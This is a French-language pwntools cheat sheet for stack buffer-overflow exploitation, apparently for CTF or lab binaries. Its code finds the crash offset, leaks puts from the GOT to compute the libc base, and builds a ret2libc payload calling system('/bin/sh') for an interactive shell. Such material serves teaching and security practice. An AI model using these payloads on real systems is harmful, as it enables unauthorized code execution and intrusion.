
> [!TIP]
> **Reminder**
> 
> Penser à patcher l'interpréteur si nécessaire:
> `patchelf --set-interpreter /lib/ld-linux.so.2 binary`
>
---
# Download

```python
from pwn import *

s = ssh('username', 'host', password='pass', port=4444)
s.download('path/file', 'file_local')
```
---
# Recherche Offset

```python
from pwn import *

p = process(['./binary', cyclic(500)]) 
p.wait()
core = p.corefile # charge le core dump de la mémoire après le crash
                  # contient l'état de la mémoire, des registres et de la stack

print(hex(core.eip))
print(cyclic.find(core.eip))
```
---
# libc
### Leak libc

```python
from pwn import *

elf = ELF('./binary')

payload  = b"A"*offset
payload += p32(elf.plt['puts']) # appel de la fonction puts
payload += p32(elf.symbols['main']) # @ de retour sur main pour éviter le crash
payload += p32(elf.got['puts']) # @ réelle de la fonction puts

p = process(['./binary', payload])
p.recvuntil(b"anything") # attendre l'affichage du prompte sinon risque de bruit
leak = u32(p.recv(4))

print(hex(leak))
```

| Architecture | Fonction         |
| ------------ | ---------------- |
| **i386**     | `p32()`, `u32()` |
| **amd64**    | `p64()`, `u64()` |
### Calcul de la base libc

```python
libc = ELF('./libc')
libc_base = leak - libc.symbols['puts'] 
```
### Résolution d'adresse

```python
system = libc_base + libc.symbols['system']
binsh = libc_base + libc.symbols[b"/bin/sh"]
```
### Payload final

```python
payload  = b"A"*offset
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(binsh)

# stdin
p.sendline(payload)
p.interactive()

# argument
p = process(['./binary', payload])
p.interactive()
``` 
